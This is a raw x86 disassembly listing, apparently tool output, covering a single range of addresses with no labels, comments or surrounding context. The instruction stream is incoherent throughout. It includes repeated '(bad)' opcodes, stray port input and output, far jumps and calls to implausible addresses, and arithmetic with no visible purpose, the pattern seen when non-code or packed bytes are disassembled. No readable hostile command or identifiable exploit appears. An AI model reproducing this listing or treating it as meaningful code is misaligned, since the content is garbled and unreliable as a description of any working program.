  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
